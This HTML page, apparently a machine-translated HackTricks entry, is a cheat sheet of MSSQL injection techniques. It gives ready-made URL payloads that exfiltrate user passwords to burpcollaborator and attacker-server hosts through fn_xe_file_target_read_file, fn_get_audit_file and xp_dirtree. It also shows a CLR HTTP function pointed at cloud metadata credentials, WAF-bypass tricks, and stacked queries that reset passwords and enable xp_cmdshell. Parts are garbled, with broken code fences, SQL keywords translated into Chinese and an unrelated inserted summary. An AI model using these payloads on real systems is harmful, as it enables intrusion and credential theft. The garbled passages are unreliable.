<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>MSSQL Injection</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="mssql-æ³¨å…¥"><a class="header" href="#mssql-æ³¨å…¥">MSSQL æ³¨å…¥</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="active-directory-æšä¸¾"><a class="header" href="#active-directory-æšä¸¾">Active Directory æšä¸¾</a></h2>
<p>å¯ä»¥é€šè¿‡ SQL æ³¨å…¥åœ¨ MSSQL æœåŠ¡å™¨ä¸­ <strong>æšä¸¾åŸŸç”¨æˆ·</strong>ï¼Œä½¿ç”¨ä»¥ä¸‹ MSSQL å‡½æ•°ï¼š</p>
<ul>
<li><strong><code>SELECT DEFAULT_DOMAIN()</code></strong>ï¼šè·å–å½“å‰åŸŸåã€‚</li>
<li><strong><code>master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))</code></strong>ï¼šå¦‚æœä½ çŸ¥é“åŸŸçš„åç§°ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯ <em>DOMAIN</em>ï¼‰ï¼Œè¿™ä¸ªå‡½æ•°å°†è¿”å› <strong>ç®¡ç†å‘˜ç”¨æˆ·çš„ SID</strong>ï¼Œä»¥åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºã€‚å®ƒçœ‹èµ·æ¥åƒ <code>0x01050000000[...]0000f401</code>ï¼Œæ³¨æ„ <strong>æœ€å 4 ä¸ªå­—èŠ‚</strong>æ˜¯ <strong>500</strong> çš„ <strong>å¤§ç«¯æ ¼å¼</strong>ï¼Œè¿™æ˜¯ <strong>ç®¡ç†å‘˜ç”¨æˆ·çš„å¸¸è§ ID</strong>ã€‚<br />
è¿™ä¸ªå‡½æ•°å°†å…è®¸ä½  <strong>çŸ¥é“åŸŸçš„ ID</strong>ï¼ˆé™¤äº†æœ€å 4 ä¸ªå­—èŠ‚ä»¥å¤–çš„æ‰€æœ‰å­—èŠ‚ï¼‰ã€‚</li>
<li><strong><code>SUSER_SNAME(0x01050000000[...]0000e803)</code></strong>ï¼šè¿™ä¸ªå‡½æ•°å°†è¿”å› <strong>æ‰€æŒ‡ç¤º ID çš„ç”¨æˆ·å</strong>ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ <strong>0000e803</strong> çš„å¤§ç«¯æ ¼å¼ == <strong>1000</strong>ï¼ˆé€šå¸¸è¿™æ˜¯åˆ›å»ºçš„ç¬¬ä¸€ä¸ªå¸¸è§„ç”¨æˆ· IDï¼‰ã€‚ç„¶åä½ å¯ä»¥æƒ³è±¡ä½ å¯ä»¥å¯¹ç”¨æˆ· ID ä» 1000 åˆ° 2000 è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå¯èƒ½ä¼šè·å–åŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨å¦‚ä¸‹å‡½æ•°ï¼š</li>
</ul>
<pre><code class="language-python">def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('&lt;I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
</code></pre>
<h2 id="æ›¿ä»£çš„åŸºäºé”™è¯¯çš„å‘é‡"><a class="header" href="#æ›¿ä»£çš„åŸºäºé”™è¯¯çš„å‘é‡"><strong>æ›¿ä»£çš„åŸºäºé”™è¯¯çš„å‘é‡</strong></a></h2>
<p>åŸºäºé”™è¯¯çš„ SQL æ³¨å…¥é€šå¸¸ç±»ä¼¼äº <code>+AND+1=@@version--</code> è¿™æ ·çš„æ„é€ ï¼Œä»¥åŠåŸºäº Â«ORÂ» æ“ä½œç¬¦çš„å˜ä½“ã€‚åŒ…å«æ­¤ç±»è¡¨è¾¾å¼çš„æŸ¥è¯¢é€šå¸¸ä¼šè¢« WAF é˜»æ­¢ã€‚ä½œä¸ºç»•è¿‡æ–¹æ³•ï¼Œä½¿ç”¨ %2b å­—ç¬¦è¿æ¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸è§¦å‘æ•°æ®ç±»å‹è½¬æ¢é”™è¯¯çš„ç‰¹å®šå‡½æ•°è°ƒç”¨çš„ç»“æœã€‚</p>
<p>ä¸€äº›æ­¤ç±»å‡½æ•°çš„ç¤ºä¾‹ï¼š</p>
<ul>
<li><code>SUSER_NAME()</code></li>
<li><code>USER_NAME()</code></li>
<li><code>PERMISSIONS()</code></li>
<li><code>DB_NAME()</code></li>
<li><code>FILE_NAME()</code></li>
<li><code>TYPE_NAME()</code></li>
<li><code>COL_NAME()</code></li>
</ul>
<p>å‡½æ•° <code>USER_NAME()</code> çš„ç¤ºä¾‹ç”¨æ³•ï¼š</p>
<pre><code>https://vuln.app/getItem?id=1'%2buser_name(@@version)--
</code></pre>
<p><img src="https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png" alt="" /></p>
<h2 id="ssrf"><a class="header" href="#ssrf">SSRF</a></h2>
<p>è¿™äº› SSRF æŠ€å·§ <a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/">æ¥è‡ªè¿™é‡Œ</a></p>
<h3 id="fn_xe_file_target_read_file"><a class="header" href="#fn_xe_file_target_read_file"><code>fn_xe_file_target_read_file</code></a></h3>
<p>å®ƒéœ€è¦æœåŠ¡å™¨ä¸Šçš„ <strong><code>VIEW SERVER STATE</code></strong> æƒé™ã€‚</p>
<pre><code>https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
</code></pre>
<pre><code class="language-sql"># Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
</code></pre>
<h3 id="fn_get_audit_file"><a class="header" href="#fn_get_audit_file"><code>fn_get_audit_file</code></a></h3>
<p>å®ƒéœ€è¦ <strong><code>CONTROL SERVER</code></strong> æƒé™ã€‚</p>
<pre><code>https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
</code></pre>
<pre><code class="language-sql"># Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
</code></pre>
<h3 id="fn_trace_gettabe"><a class="header" href="#fn_trace_gettabe"><code>fn_trace_gettabe</code></a></h3>
<p>å®ƒéœ€è¦ <strong><code>CONTROL SERVER</code></strong> æƒé™ã€‚</p>
<pre><code>https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
</code></pre>
<pre><code class="language-sql"># Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
</code></pre>
<h3 id="xp_dirtree-xp_fileexists-xp_subdirs"><a class="header" href="#xp_dirtree-xp_fileexists-xp_subdirs"><code>xp_dirtree</code>, <code>xp_fileexists</code>, <code>xp_subdirs</code> <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a></a></h3>
<p>åƒ <code>xp_dirtree</code> è¿™æ ·çš„å­˜å‚¨è¿‡ç¨‹ï¼Œå°½ç®¡æ²¡æœ‰è¢«å¾®è½¯æ­£å¼æ–‡æ¡£åŒ–ï¼Œä½†ç”±äºå…¶åœ¨ MSSQL ä¸­ç½‘ç»œæ“ä½œçš„å®ç”¨æ€§ï¼Œå·²è¢«å…¶ä»–äººåœ¨çº¿æè¿°ã€‚è¿™äº›è¿‡ç¨‹é€šå¸¸ç”¨äºå¸¦å¤–æ•°æ®å¤–æ³„ï¼Œå¦‚å„ç§ <a href="https://www.notsosecure.com/oob-exploitation-cheatsheet/">ç¤ºä¾‹</a> å’Œ <a href="https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/">å¸–å­</a> ä¸­æ‰€å±•ç¤ºçš„ã€‚</p>
<p>ä¾‹å¦‚ï¼Œ<code>xp_dirtree</code> å­˜å‚¨è¿‡ç¨‹ç”¨äºå‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œä½†ä»…é™äº TCP ç«¯å£ 445ã€‚ç«¯å£å·ä¸å¯ä¿®æ”¹ï¼Œä½†å®ƒå…è®¸ä»ç½‘ç»œå…±äº«è¯»å–ã€‚ä½¿ç”¨æ–¹æ³•åœ¨ä¸‹é¢çš„ SQL è„šæœ¬ä¸­æ¼”ç¤ºï¼š</p>
<pre><code class="language-sql">DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
</code></pre>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æ–¹æ³•å¯èƒ½å¹¶ä¸é€‚ç”¨äºæ‰€æœ‰ç³»ç»Ÿé…ç½®ï¼Œä¾‹å¦‚åœ¨é»˜è®¤è®¾ç½®ä¸‹è¿è¡Œçš„ <code>Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)</code> å’Œ <code>Windows Server 2016 Datacenter</code>ã€‚</p>
<p>æ­¤å¤–ï¼Œè¿˜æœ‰å…¶ä»–å­˜å‚¨è¿‡ç¨‹ï¼Œå¦‚ <code>master..xp_fileexist</code> å’Œ <code>xp_subdirs</code>ï¼Œå¯ä»¥å®ç°ç±»ä¼¼çš„ç»“æœã€‚æœ‰å…³ <code>xp_fileexist</code> çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…è¿™ç¯‡ <a href="https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx">TechNet æ–‡ç« </a>ã€‚</p>
<h3 id="xp_cmdshell"><a class="header" href="#xp_cmdshell"><code>xp_cmdshell</code> <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a></a></h3>
<p>æ˜¾ç„¶ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ <strong><code>xp_cmdshell</code></strong> æ¥ <strong>æ‰§è¡Œ</strong> è§¦å‘ <strong>SSRF</strong> çš„æ“ä½œã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯· <strong>é˜…è¯»ç›¸å…³éƒ¨åˆ†</strong>ï¼š</p>
<p>{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
<a href="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/">pentesting-mssql-microsoft-sql-server</a>
{% endcontent-ref %}</p>
<h3 id="mssql-ç”¨æˆ·å®šä¹‰å‡½æ•°---sqlhttp"><a class="header" href="#mssql-ç”¨æˆ·å®šä¹‰å‡½æ•°---sqlhttp">MSSQL ç”¨æˆ·å®šä¹‰å‡½æ•° - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a></a></h3>
<p>åˆ›å»ºä¸€ä¸ª CLR UDFï¼ˆå…¬å…±è¯­è¨€è¿è¡Œæ—¶ç”¨æˆ·å®šä¹‰å‡½æ•°ï¼‰ï¼Œå³ç”¨ä»»ä½• .NET è¯­è¨€ç¼–å†™å¹¶ç¼–è¯‘æˆ DLL çš„ä»£ç ï¼Œä»¥ä¾¿åœ¨ MSSQL ä¸­åŠ è½½ä»¥æ‰§è¡Œè‡ªå®šä¹‰å‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªéœ€è¦ <code>dbo</code> è®¿é—®æƒé™çš„è¿‡ç¨‹ã€‚è¿™æ„å‘³ç€é€šå¸¸åªæœ‰åœ¨ä»¥ <code>sa</code> æˆ–ç®¡ç†å‘˜è§’è‰²è¿›è¡Œæ•°æ®åº“è¿æ¥æ—¶æ‰å¯è¡Œã€‚</p>
<p>åœ¨ <a href="https://github.com/infiniteloopltd/SQLHttp">è¿™ä¸ª Github ä»“åº“</a> ä¸­æä¾›äº† Visual Studio é¡¹ç›®å’Œå®‰è£…è¯´æ˜ï¼Œä»¥ä¾¿å°†äºŒè¿›åˆ¶æ–‡ä»¶ä½œä¸º CLR ç¨‹åºé›†åŠ è½½åˆ° MSSQL ä¸­ï¼Œä»è€Œä½¿å¾—å¯ä»¥ä» MSSQL å†…éƒ¨æ‰§è¡Œ HTTP GET è¯·æ±‚ã€‚</p>
<p>æ­¤åŠŸèƒ½çš„æ ¸å¿ƒå°è£…åœ¨ <code>http.cs</code> æ–‡ä»¶ä¸­ï¼Œè¯¥æ–‡ä»¶ä½¿ç”¨ <code>WebClient</code> ç±»æ‰§è¡Œ GET è¯·æ±‚å¹¶æ£€ç´¢å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="language-csharp">using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
</code></pre>
<p>åœ¨æ‰§è¡Œ <code>CREATE ASSEMBLY</code> SQL å‘½ä»¤ä¹‹å‰ï¼Œå»ºè®®è¿è¡Œä»¥ä¸‹ SQL ä»£ç ç‰‡æ®µï¼Œå°†ç¨‹åºé›†çš„ SHA512 å“ˆå¸Œæ·»åŠ åˆ°æœåŠ¡å™¨çš„å—ä¿¡ä»»ç¨‹åºé›†åˆ—è¡¨ä¸­ï¼ˆå¯é€šè¿‡ <code>select * from sys.trusted_assemblies;</code> æŸ¥çœ‹ï¼‰ï¼š</p>
<pre><code class="language-sql">EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
</code></pre>
<p>åœ¨æˆåŠŸæ·»åŠ ç¨‹åºé›†å¹¶åˆ›å»ºå‡½æ•°åï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ SQL ä»£ç æ‰§è¡Œ HTTP è¯·æ±‚ï¼š</p>
<pre><code class="language-sql">DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
</code></pre>
<h3 id="å¿«é€Ÿåˆ©ç”¨åœ¨å•ä¸ªæŸ¥è¯¢ä¸­æ£€ç´¢æ•´ä¸ªè¡¨çš„å†…å®¹"><a class="header" href="#å¿«é€Ÿåˆ©ç”¨åœ¨å•ä¸ªæŸ¥è¯¢ä¸­æ£€ç´¢æ•´ä¸ªè¡¨çš„å†…å®¹"><strong>å¿«é€Ÿåˆ©ç”¨ï¼šåœ¨å•ä¸ªæŸ¥è¯¢ä¸­æ£€ç´¢æ•´ä¸ªè¡¨çš„å†…å®¹</strong></a></h3>
<p><a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/">Trick from here</a>.</p>
<p>æå–è¡¨çš„å®Œæ•´å†…å®¹çš„ç®€æ´æ–¹æ³•æ¶‰åŠä½¿ç”¨ <code>FOR JSON</code> å­å¥ã€‚ä¸éœ€è¦ç‰¹å®šæ¨¡å¼å¦‚â€œåŸå§‹â€çš„ <code>FOR XML</code> å­å¥ç›¸æ¯”ï¼Œè¿™ç§æ–¹æ³•æ›´ç®€æ´ã€‚ç”±äºå…¶ç®€æ´æ€§ï¼Œ<code>FOR JSON</code> å­å¥æ›´å—æ¬¢è¿ã€‚</p>
<p>ä»¥ä¸‹æ˜¯å¦‚ä½•ä»å½“å‰æ•°æ®åº“æ£€ç´¢æ¨¡å¼ã€è¡¨å’Œåˆ—çš„æ–¹æ³•ï¼š</p>
<pre><code class="language-sql">https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
```markdown
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
</code></pre>
<pre><code>
### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
```markdown
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
</code></pre>
<pre><code>
To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
</code></pre>
<h2 id="little-tricks-for-waf-bypasses"><a class="header" href="#little-tricks-for-waf-bypasses"><strong>Little tricks for WAF bypasses</strong></a></h2>
<p><a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/">Tricks also from here</a></p>
<p>Non-standard whitespace characters: %C2%85 Ğ¸Ğ»Ğ¸ %C2%A0:</p>
<pre><code>```markdown
# MSSQL æ³¨å…¥

MSSQL æ³¨å…¥æ˜¯ä¸€ç§æ”»å‡»æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ SQL æŸ¥è¯¢ä¸­æ’å…¥æ¶æ„ä»£ç æ¥æ“æ§æ•°æ®åº“ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ MSSQL æ³¨å…¥æŠ€æœ¯ã€‚

## åŸºæœ¬ç¤ºä¾‹

é€šè¿‡åœ¨ URL ä¸­æ’å…¥ SQL ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥è·å–æ•°æ®åº“ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼š

</code></pre>
<p>https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--</p>
<pre><code>
åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæ”»å‡»è€…ä½¿ç”¨äº† `UNION` è¯­å¥æ¥åˆå¹¶æŸ¥è¯¢ç»“æœï¼Œå¹¶è·å– SQL Server çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚

## é˜²å¾¡æªæ–½

ä¸ºäº†é˜²æ­¢ MSSQL æ³¨å…¥ï¼Œå¼€å‘è€…åº”é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

1. ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ã€‚
2. å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼éªŒè¯ã€‚
3. é™åˆ¶æ•°æ®åº“ç”¨æˆ·çš„æƒé™ã€‚

é€šè¿‡å®æ–½è¿™äº›æªæ–½ï¼Œå¯ä»¥æ˜¾è‘—é™ä½ MSSQL æ³¨å…¥æ”»å‡»çš„é£é™©ã€‚
</code></pre>
<pre><code>
Scientific (0e) and hex (0x) notation for obfuscating UNION:

</code></pre>
<p>https://vuln.app/getItem?id=0eunion+select+null,@@version,null--</p>
<p>https://vuln.app/getItem?id=0xunion+select+null,@@version,null--</p>
<pre><code>
A period instead of a whitespace between FROM and a column name:

</code></pre>
<pre><code class="language-markdown">https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
</code></pre>
<pre><code>
\N separator between SELECT and a throwaway column:

</code></pre>
<p>https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--</p>
<pre><code>
### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
SELECT 'a' SELECT 'b'
</code></pre>
<p>So for example, multiple queries such as:</p>
<pre><code class="language-sql">ä½¿ç”¨ [tempdb]  
åˆ›å»ºè¡¨ [test] ([id] int)  
æ’å…¥ [test] å€¼(1)  
é€‰æ‹© [id] ä» [test]  
åˆ é™¤è¡¨ [test]
</code></pre>
<p>Can be reduced to:</p>
<pre><code class="language-sql">use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
</code></pre>
<p>Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:</p>
<pre><code># åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªæ— ç”¨çš„ exec() å¹¶è®© WAF è®¤ä¸ºè¿™ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æŸ¥è¯¢
admina'union select 1,'admin','testtest123'exec('select 1')--
## è¿™å°†æ˜¯ï¼š
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# ä½¿ç”¨å¥‡æ€ªæ„å»ºçš„æŸ¥è¯¢
admin'exec('update[users]set[password]=''a''')--
## è¿™å°†æ˜¯ï¼š
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# æˆ–è€…å¯ç”¨ xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## è¿™å°†æ˜¯
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
</code></pre>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/">https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/</a></li>
<li><a href="https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/">https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/</a></li>
</ul>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
